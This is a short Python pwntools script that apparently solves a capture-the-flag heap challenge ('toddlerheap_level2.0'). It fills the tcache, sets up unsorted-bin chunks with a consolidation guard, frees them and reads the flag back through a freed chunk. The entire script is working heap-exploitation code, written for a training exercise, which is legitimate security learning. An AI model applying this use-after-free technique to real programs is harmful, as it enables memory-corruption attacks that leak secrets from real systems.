from pwn import *

context.arch = 'amd64'

p = process("/challenge/toddlerheap_level2.0")

def fillup_tcache():
    for idx in range(7):
        p.sendline(f'malloc {idx} 1024')

fillup_tcache()

# unsorted bin
p.sendline(b"malloc 7 1024")
p.sendline(b"malloc 8 1024")

# consolidation guard
p.sendline(b"malloc 9 1024")

# another unsorted bin chunk
p.sendline(b"malloc 10 1024")

# free all except guard
for idx in range(9):
    p.sendline(f'free {idx}')
p.sendline(b'free 10')

p.sendline(b"read_flag")
p.sendline(b"puts 10")
p.interactive()
